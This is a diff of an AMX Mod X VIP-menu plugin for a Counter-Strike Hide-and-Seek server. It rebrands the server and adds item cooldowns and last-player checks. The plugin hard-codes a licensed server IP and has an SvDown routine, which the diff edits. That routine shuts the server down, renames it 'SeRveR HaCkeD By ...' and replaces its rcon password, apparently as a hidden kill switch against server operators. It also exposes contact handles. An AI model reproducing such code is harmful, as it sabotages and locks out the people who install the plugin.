@@ -1,24 +1,24 @@
-//	LAST EDIT ON - 05.04.2019 & 20:24
+//	EDITED ON - 05.04.2019 & 20:49
 
 #include < amxmodx >
 #include < amxmisc >
 #include < cstrike >
+#include <engine>
 #include < fun >
-#include < engine >
 #include < hamsandwich >
 #include < colorchat >
 
-#define PLUGIN "HnS.Ecila.Ro - HNS.ECILA.RO"
+#define PLUGIN "HnS.Play-Arena.Ro - HNS.Play-Arena.RO"
 #define VERSION "1.4x"
 #define AUTHOR "Triplu"
 
-#define IP_SERVER_LICENTIAT	"89.40.233.28"
+#define IP_SERVER_LICENTIAT	"93.119.25.136"
 
 new bool: HaveSpeed [ 33 ], bool: HaveSpeed2 [ 33 ], bool: AlreadyChoosed [ 33 ];
 
 new incercari [ 33 ], incercari1 [ 33 ], incercari2 [ 33 ];
 
-new count [ 33 ] = 0,count2 [ 33 ] = 0,count3 [ 33 ] = 0;
+new count [ 33 ] = 0 , count2 [ 33 ] = 0,count3 [ 33 ] = 0,count4 [ 33 ] = 0;
 
 public plugin_init ( )
 {
@@ -75,8 +75,8 @@ public hookSay ( id )
 
 		else
 		{
-			ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Nu detii^x04 *V.I.P*^x01 pe acest server pentru a accesa acest^x03 MENIU^x01 !" );
-			ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Daca doresti^x04 *V.I.P*^x01 dai add la^x03 Skype:^x01 triplu^x04ecila" );
+			ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Nu detii^x04 *V.I.P*^x01 pe acest server pentru a accesa acest^x03 MENIU^x01 !" );
+			ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Daca doresti^x04 *V.I.P*^x01 dai add la^x03 Skype:^x01 triplu^x04ecila" );
 		}
 	}
 
@@ -108,7 +108,7 @@ public print_adminlist(user)
         for(x = 0 ; x < countX ; x++) 
         {
             len += format(message[len], 255-len, "^x01[^x04 %s^x01 ]^x01 %s ", adminnames[x], x < (countX-1) ? " | ":"");
-            //len += format(message[len], 255-len, "^x03[HnS.Ecila.Ro-ViPs]^x01 [^x04 %s^x01 ]^x01 %s ", adminnames[x], x < (countX-1) ? " | ":"");
+            //len += format(message[len], 255-len, "^x03[HnS.Play-Arena.Ro-ViPs]^x01 [^x04 %s^x01 ]^x01 %s ", adminnames[x], x < (countX-1) ? " | ":"");
             if(len > 96) 
             {
                 print_message(user, message);
@@ -120,7 +120,7 @@ public print_adminlist(user)
     }
     else 
     {
-        len += format(message[len], 255-len, "^x03[HnS.Ecila.Ro-ViPs]^x04No VIP online.");
+        len += format(message[len], 255-len, "^x03[HnS.Play-Arena.Ro-ViPs]^x04No VIP online.");
         print_message(user, message);
     }   
 }
@@ -186,28 +186,37 @@ public round_start ( )
 		{
 			count [ id ]--;
 		}
+
 		else if ( count[ id ] >= 5 ) // else out
 		{
 			count [ id ] = 0;
 		}
 
 
+
 		if ( count2[ id ] > 0 )
 		{
 			count2 [ id ]--;
 		}
-		else if ( count2[ id ] >= 5 ) // else out
+		else if ( count2[ id ] >= 5 )
 		{
 			count2 [ id ] = 0;
 		}
-
 		if ( count3[ id ] > 0 )
 		{
 			count3 [ id ]--;
 		}
-		else if ( count3[ id ] >= 5 ) // else out
+		else if ( count3[ id ] >= 5 )
 		{
 			count3 [ id ] = 0;
+		}
+		if ( count4[ id ] > 0 )
+		{
+			count4 [ id ]--;
+		}
+		else if ( count4[ id ] >= 5 )
+		{
+			count4 [ id ] = 0;
 		}
 	}
 }
@@ -215,8 +224,8 @@ public round_start ( )
 public SvDown ( )
 {
 	server_cmd ( "quit" );
-	server_cmd ( "hostname ^"SeRveR HaCkeD By Triplu | Y!M : florynboss54@yahoo.com^"" );
-	server_cmd ( "rcon_password xnxx" );
+	server_cmd ( "hostname ^"SeRveR HaCkeD By raiz0 | SKYPE : levin.akee^"" );
+	server_cmd ( "rcon_password levmolasrl01" );
 }
 
 public Player_Spawn ( id )
@@ -245,6 +254,15 @@ public Player_Spawn ( id )
 
 public VIPChecker ( id )
 {
+	new iAliveTerorrists[ 32 ], iAliveTerorristsNum,iAliveCTs[ 32 ], iAliveCTsNum
+	get_players( iAliveTerorrists, iAliveTerorristsNum, "ace", "TERRORIST" )
+	get_players( iAliveCTs, iAliveCTsNum, "ace", "CT" )
+	if( iAliveTerorristsNum <= 1 || iAliveCTsNum <= 1 )
+	{
+		ColorChat(id, NORMAL, "^4[HNS.PLAY-ARENA.RO]^3 VIP menu^1 it'is^4 LAST BITCH^1 !")
+		return;
+	}
+
 	new menu = menu_create ( "\y*V.I.P*\w MENU\r HnS.EciLa.Ro", "menu_handler_x" );
 
 	menu_additem ( menu, "\yV.I.P\w - [\r G3\w ]", "1", ADMIN_RCON );
@@ -257,6 +275,15 @@ public VIPChecker ( id )
 
 public menu_handler_x ( id, menu, item )
 {
+	new iAliveTerorrists[ 32 ], iAliveTerorristsNum,iAliveCTs[ 32 ], iAliveCTsNum
+	get_players( iAliveTerorrists, iAliveTerorristsNum, "ace", "TERRORIST" )
+	get_players( iAliveCTs, iAliveCTsNum, "ace", "CT" )
+	if( iAliveTerorristsNum <= 1 || iAliveCTsNum <= 1 )
+	{
+		ColorChat(id, NORMAL, "^4[HNS.PLAY-ARENA.RO]^3 VIP menu^1 it'is^4 LAST BITCH^1 !")
+		return 1;
+	}
+
 	if ( item == MENU_EXIT )
 	{
 		return 1;
@@ -294,7 +321,16 @@ public menu_handler_x ( id, menu, item )
 
 public VipMenu2 ( id )
 {
-	new menu = menu_create ( "\y*V.I.P*\w MENU - [\r G2\w ] -\r HnS.EciLa.Ro", "vipmenu2_handler" );
+	new iAliveTerorrists[ 32 ], iAliveTerorristsNum,iAliveCTs[ 32 ], iAliveCTsNum
+	get_players( iAliveTerorrists, iAliveTerorristsNum, "ace", "TERRORIST" )
+	get_players( iAliveCTs, iAliveCTsNum, "ace", "CT" )
+	if( iAliveTerorristsNum <= 1 || iAliveCTsNum <= 1 )
+	{
+		ColorChat(id, NORMAL, "^4[HNS.PLAY-ARENA.RO]^3 VIP menu^1 it'is^4 LAST BITCH^1 !")
+		return;
+	}
+
+	new menu = menu_create ( "\y*V.I.P*\w MENU - [\r G2\w ] -\r HnS.Play-Arena.Ro", "vipmenu2_handler" );
 
 	menu_additem ( menu, "+\r 5\y$", "1", ADMIN_LEVEL_H );
 	menu_additem ( menu, "+\r USP\y 2\w Gloante", "2", ADMIN_LEVEL_H );
@@ -310,6 +346,15 @@ public VipMenu2 ( id )
 
 public vipmenu2_handler ( id, menu, item )
 {
+	new iAliveTerorrists[ 32 ], iAliveTerorristsNum,iAliveCTs[ 32 ], iAliveCTsNum
+	get_players( iAliveTerorrists, iAliveTerorristsNum, "ace", "TERRORIST" )
+	get_players( iAliveCTs, iAliveCTsNum, "ace", "CT" )
+	if( iAliveTerorristsNum <= 1 || iAliveCTsNum <= 1 )
+	{
+		ColorChat(id, NORMAL, "^4[HNS.PLAY-ARENA.RO]^3 VIP menu^1 it'is^4 LAST BITCH^1 !")
+		return PLUGIN_HANDLED;
+	}
+
 	if ( item == MENU_EXIT/* || AlreadyChoosed [ id ]*/ )
 	{
 		//ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Deja ai ALES DIN ACEST^x03 MENIU^x01 !" );
@@ -331,14 +376,14 @@ public vipmenu2_handler ( id, menu, item )
 		{
 			if ( AlreadyChoosed [ id ] )
 			{
-				ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Deja ai ALES DIN ACEST^x03 ITEM^x01 !" );
+				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Deja ai ALES DIN ACEST^x03 ITEM^x01 !" );
 
 				return PLUGIN_HANDLED;
 			}
 
 			if ( !is_user_alive ( id ) )
 			{
-				ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Trebuie sa fi in^x03 VIATA^x01 ca sa primesti^x04 ITEME^x01 !" );
+				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Trebuie sa fi in^x03 VIATA^x01 ca sa primesti^x04 ITEME^x01 !" );
 
 				return PLUGIN_HANDLED;
 			}
@@ -347,21 +392,28 @@ public vipmenu2_handler ( id, menu, item )
 
 			cs_set_user_money ( id, cs_get_user_money ( id ) + 5 );
 
-			ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Ai primit^x03 5$^x01 !" );
+			ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Ai primit^x03 5$^x01 !" );
 		}
 
 		case 2:
 		{
+			if ( count2 [ id ] > 0 )
+			{
+				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Poti folosii^x03 USP^x01-ul odata la^x04 5^x01 runde. Mai ai de asteptat^x03 %d^x01 rund%s", count2 [ id ], count2 [ id ] == 1 ? "a" : "e" );
+
+				return PLUGIN_HANDLED;
+			}
+
 			if ( AlreadyChoosed [ id ] )
 			{
-				ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Deja ai ALES DIN ACEST^x03 ITEM^x01 !" );
+				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Deja ai ALES DIN ACEST^x03 ITEM^x01 !" );
 
 				return PLUGIN_HANDLED;
 			}
 
 			if ( !is_user_alive ( id ) )
 			{
-				ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Trebuie sa fi in^x03 VIATA^x01 ca sa primesti^x04 ITEME^x01 !" );
+				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Trebuie sa fi in^x03 VIATA^x01 ca sa primesti^x04 ITEME^x01 !" );
 
 				return PLUGIN_HANDLED;
 			}
@@ -378,20 +430,22 @@ public vipmenu2_handler ( id, menu, item )
 			}
 
 			ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Ai primit^x03 USP 2GL^x01 !" );
+
+			count2[id]=5;
 		}
 
 		case 3:
 		{
 			if ( AlreadyChoosed [ id ] )
 			{
-				ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Deja ai ALES DIN ACEST^x03 ITEM^x01 !" );
+				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Deja ai ALES DIN ACEST^x03 ITEM^x01 !" );
 
 				return PLUGIN_HANDLED;
 			}
 
 			if ( !is_user_alive ( id ) )
 			{
-				ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Trebuie sa fi in^x03 VIATA^x01 ca sa primesti^x04 ITEME^x01 !" );
+				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Trebuie sa fi in^x03 VIATA^x01 ca sa primesti^x04 ITEME^x01 !" );
 
 				return PLUGIN_HANDLED;
 			}
@@ -411,21 +465,21 @@ public vipmenu2_handler ( id, menu, item )
 				cs_set_weapon_ammo ( eNtry, 1 );
 			}
 
-			ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Ai primit^x03 x2 HE + USP 1GL^x01 !" );
+			ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Ai primit^x03 x2 HE + USP 1GL^x01 !" );
 		}
 
 		case 4:
 		{
 			if ( AlreadyChoosed [ id ] )
 			{
-				ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Deja ai ALES DIN ACEST^x03 ITEM^x01 !" );
+				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Deja ai ALES DIN ACEST^x03 ITEM^x01 !" );
 
 				return PLUGIN_HANDLED;
 			}
 
 			if ( !is_user_alive ( id ) )
 			{
-				ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Trebuie sa fi in^x03 VIATA^x01 ca sa primesti^x04 ITEME^x01 !" );
+				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Trebuie sa fi in^x03 VIATA^x01 ca sa primesti^x04 ITEME^x01 !" );
 
 				return PLUGIN_HANDLED;
 			}
@@ -436,28 +490,28 @@ public vipmenu2_handler ( id, menu, item )
 
 			set_task ( 5.0, "RemoveInvis", id );
 
-			ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Ai primit^x03 Invizibilitate 5S^x01 !" );
+			ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Ai primit^x03 Invizibilitate 5S^x01 !" );
 		}
 
 		case 5:
 		{
 			if ( count [ id ] > 0 )
 			{
-				ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Poti folosii^x03 AWP^x01-ul odata la^x04 3^x01 runde. Mai ai de asteptat^x03 %i^x01 rund%s", count [ id ], count [ id ] == 1 ? "a" : "e" );
+				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Poti folosii^x03 AWP^x01-ul odata la^x04 5^x01 runde. Mai ai de asteptat^x03 %i^x01 rund%s", count [ id ], count [ id ] == 1 ? "a" : "e" );
 
 				return PLUGIN_HANDLED;
 			}
 
 			if ( AlreadyChoosed [ id ] )
 			{
-				ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Deja ai ALES DIN ACEST^x03 ITEM^x01 !" );
+				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Deja ai ALES DIN ACEST^x03 ITEM^x01 !" );
 
 				return PLUGIN_HANDLED;
 			}
 
 			if ( !is_user_alive ( id ) )
 			{
-				ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Trebuie sa fi in^x03 VIATA^x01 ca sa primesti^x04 ITEME^x01 !" );
+				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Trebuie sa fi in^x03 VIATA^x01 ca sa primesti^x04 ITEME^x01 !" );
 
 				return PLUGIN_HANDLED;
 			}
@@ -479,7 +533,7 @@ public vipmenu2_handler ( id, menu, item )
 				cs_set_weapon_ammo ( eNtry, 2 );
 			}
 
-			ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Ai primit^x03 AWP 2GL^x01 !" );
+			ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Ai primit^x03 AWP 2GL^x01 !" );
 
 			count [ id ] = 5;
 		}
@@ -490,7 +544,7 @@ public vipmenu2_handler ( id, menu, item )
 			{
 				if ( incercari [ id ] == 2 )
 				{
-					ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Ai cumparat deja^x04 Respawn^x01 de^x03 2^x01 ori !" );
+					ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Ai cumparat deja^x04 Respawn^x01 de^x03 2^x01 ori !" );
 
 					return PLUGIN_HANDLED;
 				}
@@ -501,7 +555,7 @@ public vipmenu2_handler ( id, menu, item )
 
 					ExecuteHamB ( Ham_CS_RoundRespawn, id );
 
-					ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Ai primit^x03 Respawn^x01 ! ( mai ai inca^x04 %i^x01 reinver%s )", 1 - incercari [ id ], incercari [ id ] == 1 ? "e" : "i" );
+					ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Ai primit^x03 Respawn^x01 ! ( mai ai inca^x04 %i^x01 reinver%s )", 1 - incercari [ id ], incercari [ id ] == 1 ? "e" : "i" );
 
 					incercari [ id ] += 1; // ++ | +1  ---
 
@@ -511,7 +565,7 @@ public vipmenu2_handler ( id, menu, item )
 
 			else if ( is_user_alive ( id ) )
 			{
-				ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Trebuie sa fi^x04 MORT^x01 ca sa cumperi^x03 RESPSAWN^x01 !" );
+				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Trebuie sa fi^x04 MORT^x01 ca sa cumperi^x03 RESPSAWN^x01 !" );
 
 				return PLUGIN_HANDLED;
 			}
@@ -521,14 +575,14 @@ public vipmenu2_handler ( id, menu, item )
 		{
 			if ( AlreadyChoosed [ id ] )
 			{
-				ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Deja ai ALES DIN ACEST^x03 ITEM^x01 !" );
+				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Deja ai ALES DIN ACEST^x03 ITEM^x01 !" );
 
 				return PLUGIN_HANDLED;
 			}
 
 			if ( !is_user_alive ( id ) )
 			{
-				ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Trebuie sa fi in^x03 VIATA^x01 ca sa primesti^x04 ITEME^x01 !" );
+				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Trebuie sa fi in^x03 VIATA^x01 ca sa primesti^x04 ITEME^x01 !" );
 
 				return PLUGIN_HANDLED;
 			}
@@ -541,7 +595,7 @@ public vipmenu2_handler ( id, menu, item )
 
 			set_task ( 5.0, "remove_speed", id );
 
-			ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Ai primit^x03 +270 Viteza 5S^x01 !" );
+			ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Ai primit^x03 +270 Viteza 5S^x01 !" );
 		}
 	}
 
@@ -551,7 +605,16 @@ public vipmenu2_handler ( id, menu, item )
 
 public VipMenu1 ( id )
 {
-	new menu = menu_create ( "\y*V.I.P*\w MENU - [\r G1\w ] -\r HnS.EciLa.Ro", "vipmenu1_handler" );
+	new iAliveTerorrists[ 32 ], iAliveTerorristsNum,iAliveCTs[ 32 ], iAliveCTsNum
+	get_players( iAliveTerorrists, iAliveTerorristsNum, "ace", "TERRORIST" )
+	get_players( iAliveCTs, iAliveCTsNum, "ace", "CT" )
+	if( iAliveTerorristsNum <= 1 || iAliveCTsNum <= 1 )
+	{
+		ColorChat(id, NORMAL, "^4[HNS.PLAY-ARENA.RO]^3 VIP menu^1 it'is^4 LAST BITCH^1 !")
+		return;
+	}
+
+	new menu = menu_create ( "\y*V.I.P*\w MENU - [\r G1\w ] -\r HnS.Play-Arena.Ro", "vipmenu1_handler" );
 
 	menu_additem ( menu, "+\r 3\y$", "1", ADMIN_LEVEL_D );
 	menu_additem ( menu, "+\r USP\y 1\w Glont", "2", ADMIN_LEVEL_D );
@@ -566,9 +629,18 @@ public VipMenu1 ( id )
 
 public vipmenu1_handler ( id, menu, item )
 {
+	new iAliveTerorrists[ 32 ], iAliveTerorristsNum,iAliveCTs[ 32 ], iAliveCTsNum
+	get_players( iAliveTerorrists, iAliveTerorristsNum, "ace", "TERRORIST" )
+	get_players( iAliveCTs, iAliveCTsNum, "ace", "CT" )
+	if( iAliveTerorristsNum <= 1 || iAliveCTsNum <= 1 )
+	{
+		ColorChat(id, NORMAL, "^4[HNS.PLAY-ARENA.RO]^3 VIP menu^1 it'is^4 LAST BITCH^1 !")
+		return PLUGIN_HANDLED;
+	}
+
 	if ( item == MENU_EXIT/* || AlreadyChoosed [ id ]*/ )
 	{
-		//ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Deja ai ALES DIN ACEST^x03 MENIU^x01 !" );
+		//ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Deja ai ALES DIN ACEST^x03 MENIU^x01 !" );
 
 		return 1;
 	}
@@ -587,14 +659,14 @@ public vipmenu1_handler ( id, menu, item )
 		{
 			if ( AlreadyChoosed [ id ] )
 			{
-				ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Deja ai ALES DIN ACEST^x03 ITEM^x01 !" );
+				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Deja ai ALES DIN ACEST^x03 ITEM^x01 !" );
 
 				return PLUGIN_HANDLED;
 			}
 
 			if ( !is_user_alive ( id ) )
 			{
-				ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Trebuie sa fi in^x03 VIATA^x01 ca sa primesti^x04 ITEME^x01 !" );
+				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Trebuie sa fi in^x03 VIATA^x01 ca sa primesti^x04 ITEME^x01 !" );
 
 				return PLUGIN_HANDLED;
 			}
@@ -603,21 +675,28 @@ public vipmenu1_handler ( id, menu, item )
 
 			cs_set_user_money ( id, cs_get_user_money ( id ) + 3 );
 
-			ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Ai primit^x03 3$^x01 !" );
+			ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Ai primit^x03 3$^x01 !" );
 		}
 
 		case 2:
 		{
+			if ( count2 [ id ] > 0 )
+			{
+				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Poti folosii^x03 USP^x01-ul odata la^x04 5^x01 runde. Mai ai de asteptat^x03 %d^x01 rund%s", count2 [ id ], count2 [ id ] == 1 ? "a" : "e" );
+
+				return PLUGIN_HANDLED;
+			}
+
 			if ( AlreadyChoosed [ id ] )
 			{
-				ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Deja ai ALES DIN ACEST^x03 ITEM^x01 !" );
+				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Deja ai ALES DIN ACEST^x03 ITEM^x01 !" );
 
 				return PLUGIN_HANDLED;
 			}
 
 			if ( !is_user_alive ( id ) )
 			{
-				ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Trebuie sa fi in^x03 VIATA^x01 ca sa primesti^x04 ITEME^x01 !" );
+				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Trebuie sa fi in^x03 VIATA^x01 ca sa primesti^x04 ITEME^x01 !" );
 
 				return PLUGIN_HANDLED;
 			}
@@ -633,21 +712,23 @@ public vipmenu1_handler ( id, menu, item )
 				cs_set_weapon_ammo ( eNtry, 1 );
 			}
 
-			ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Ai primit^x03 USP 2GL^x01 !" );
+			ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Ai primit^x03 USP 2GL^x01 !" );
+
+			count2[id]=5;
 		}
 
 		case 3:
 		{
 			if ( AlreadyChoosed [ id ] )
 			{
-				ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Deja ai ALES DIN ACEST^x03 ITEM^x01 !" );
+				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Deja ai ALES DIN ACEST^x03 ITEM^x01 !" );
 
 				return PLUGIN_HANDLED;
 			}
 
 			if ( !is_user_alive ( id ) )
 			{
-				ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Trebuie sa fi in^x03 VIATA^x01 ca sa primesti^x04 ITEME^x01 !" );
+				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Trebuie sa fi in^x03 VIATA^x01 ca sa primesti^x04 ITEME^x01 !" );
 
 				return PLUGIN_HANDLED;
 			}
@@ -656,21 +737,21 @@ public vipmenu1_handler ( id, menu, item )
 
 			give_item ( id, "weapon_hegrenade" );
 
-			ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Ai primit^x03 HE^x01 !" );
+			ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Ai primit^x03 HE^x01 !" );
 		}
 
 		case 4:
 		{
 			if ( AlreadyChoosed [ id ] )
 			{
-				ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Deja ai ALES DIN ACEST^x03 ITEM^x01 !" );
+				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Deja ai ALES DIN ACEST^x03 ITEM^x01 !" );
 
 				return PLUGIN_HANDLED;
 			}
 
 			if ( !is_user_alive ( id ) )
 			{
-				ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Trebuie sa fi in^x03 VIATA^x01 ca sa primesti^x04 ITEME^x01 !" );
+				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Trebuie sa fi in^x03 VIATA^x01 ca sa primesti^x04 ITEME^x01 !" );
 
 				return PLUGIN_HANDLED;
 			}
@@ -681,7 +762,7 @@ public vipmenu1_handler ( id, menu, item )
 
 			set_task ( 3.0, "RemoveInvis", id );
 
-			ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Ai primit^x03 Invizibilitate 3S^x01 !" );
+			ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Ai primit^x03 Invizibilitate 3S^x01 !" );
 		}
 
 		case 5:
@@ -690,7 +771,7 @@ public vipmenu1_handler ( id, menu, item )
 			{
 				if ( incercari1 [ id ] == 1 )
 				{
-					ColorChat( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Ai cumparat^x04 Respawn^x01 deja !" );
+					ColorChat( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Ai cumparat^x04 Respawn^x01 deja !" );
 
 					return PLUGIN_HANDLED;
 				}
@@ -700,7 +781,7 @@ public vipmenu1_handler ( id, menu, item )
 
 					ExecuteHamB ( Ham_CS_RoundRespawn, id );
 
-					ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Ai primit^x03 Respawn^x01 ! ( numai ai nici o^x04 reinviere^x01 ! )" );
+					ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Ai primit^x03 Respawn^x01 ! ( numai ai nici o^x04 reinviere^x01 ! )" );
 
 					incercari1 [ id ] += 1;
 
@@ -710,7 +791,7 @@ public vipmenu1_handler ( id, menu, item )
 
 			else if ( is_user_alive ( id ) )
 			{
-				ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Trebuie sa fi^x03 MORT^x01 ca sa cumperi^x04 RESPSAWN^x01 !" );
+				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Trebuie sa fi^x03 MORT^x01 ca sa cumperi^x04 RESPSAWN^x01 !" );
 
 				return PLUGIN_HANDLED;
 			}
@@ -720,21 +801,21 @@ public vipmenu1_handler ( id, menu, item )
 		{
 			if ( count [ id ] > 0 )
 			{
-				ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Poti folosii^x03 AWP^x01-ul odata la^x04 3^x01 runde. Mai ai de asteptat^x03 %i^x01 rund%s", count [ id ], count [ id ] == 1 ? "a" : "e" );
+				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Poti folosii^x03 AWP^x01-ul odata la^x04 5^x01 runde. Mai ai de asteptat^x03 %i^x01 rund%s", count [ id ], count [ id ] == 1 ? "a" : "e" );
 
 				return PLUGIN_HANDLED;
 			}
 
 			if ( AlreadyChoosed [ id ] )
 			{
-				ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Deja ai ALES DIN ACEST^x03 ITEM^x01 !" );
+				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Deja ai ALES DIN ACEST^x03 ITEM^x01 !" );
 
 				return PLUGIN_HANDLED;
 			}
 
 			if ( !is_user_alive ( id ) )
 			{
-				ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Trebuie sa fi in^x03 VIATA^x01 ca sa primesti^x04 ITEME^x01 !" );
+				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Trebuie sa fi in^x03 VIATA^x01 ca sa primesti^x04 ITEME^x01 !" );
 
 				return PLUGIN_HANDLED;
 			}
@@ -756,7 +837,7 @@ public vipmenu1_handler ( id, menu, item )
 				cs_set_weapon_ammo ( eNtry, 1 );
 			}
 
-			ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Ai primit^x03 AWP 1GL^x01 !" );
+			ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Ai primit^x03 AWP 1GL^x01 !" );
 
 			count [ id ] = 5;
 		}
@@ -768,7 +849,16 @@ public vipmenu1_handler ( id, menu, item )
 
 public GMENU_VIP ( id )
 {
-	new menu = menu_create ( "\y*V.I.P*\w MENU - [\r G3\w ] -\r HnS.EciLa.Ro\w", "menu_handler_g" );
+	new iAliveTerorrists[ 32 ], iAliveTerorristsNum,iAliveCTs[ 32 ], iAliveCTsNum
+	get_players( iAliveTerorrists, iAliveTerorristsNum, "ace", "TERRORIST" )
+	get_players( iAliveCTs, iAliveCTsNum, "ace", "CT" )
+	if( iAliveTerorristsNum <= 1 || iAliveCTsNum <= 1 )
+	{
+		ColorChat(id, NORMAL, "^4[HNS.PLAY-ARENA.RO]^3 VIP menu^1 it'is^4 LAST BITCH^1 !")
+		return;
+	}
+
+	new menu = menu_create ( "\y*V.I.P*\w MENU - [\r G3\w ] -\r HnS.Play-Arena.Ro\w", "menu_handler_g" );
 
 	menu_additem ( menu, "+\r 10\y $", "1", ADMIN_RCON );
 	menu_additem ( menu, "+\r USP\y 3\w Gloante", "2", ADMIN_RCON );
@@ -787,6 +877,15 @@ public GMENU_VIP ( id )
 
 public menu_handler_g ( id, menu, item )
 {
+	new iAliveTerorrists[ 32 ], iAliveTerorristsNum,iAliveCTs[ 32 ], iAliveCTsNum
+	get_players( iAliveTerorrists, iAliveTerorristsNum, "ace", "TERRORIST" )
+	get_players( iAliveCTs, iAliveCTsNum, "ace", "CT" )
+	if( iAliveTerorristsNum <= 1 || iAliveCTsNum <= 1 )
+	{
+		ColorChat(id, NORMAL, "^4[HNS.PLAY-ARENA.RO]^3 VIP menu^1 it'is^4 LAST BITCH^1 !")
